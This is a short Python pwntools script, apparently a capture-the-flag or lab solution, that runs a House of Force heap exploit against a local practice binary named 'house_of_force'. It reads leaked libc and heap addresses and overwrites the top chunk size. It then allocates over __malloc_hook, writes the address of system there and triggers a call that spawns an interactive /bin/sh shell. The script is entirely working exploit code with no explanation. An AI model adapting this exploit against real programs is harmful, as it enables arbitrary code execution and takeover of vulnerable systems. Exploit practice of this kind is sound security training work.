#!/usr/bin/python3
from pwn import *
import sys
context.log_level = 'DEBUG'
context(os='linux', arch='amd64')
e = context.binary = ELF("./house_of_force")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = e.debug(gdbscript='''
source /home/nick/global/halfdisp.py
set disable-randomization on
break main
c
'''
)
def malloc(size, data):
    p.send(b"1")
    p.sendafter(b"size: ", f"{size}".encode())
    p.sendafter(b"data: ", data)
    p.recvuntil(b"> ")

def delta(x, y):
    return (0xffffffffffffffff - x) + y

p.recvuntil(b"puts() @ ")
libc.address = int(p.recvline(), 16) - libc.sym.puts

p.recvuntil(b"heap @ ")
heap = int(p.recvline(), 16)
p.recvuntil(b"> ")
p.timeout = 0.1

malloc(24, b"/bin/sh\0" + b"Y"*16 + p64(0xfffffffffffffff1))
malloc((libc.sym.__malloc_hook - 0x20) - (heap + 0x20), b"Y")

malloc(24, p64(libc.sym.system))
malloc(next(libc.search(b"/bin/sh")), b"")
p.interactive()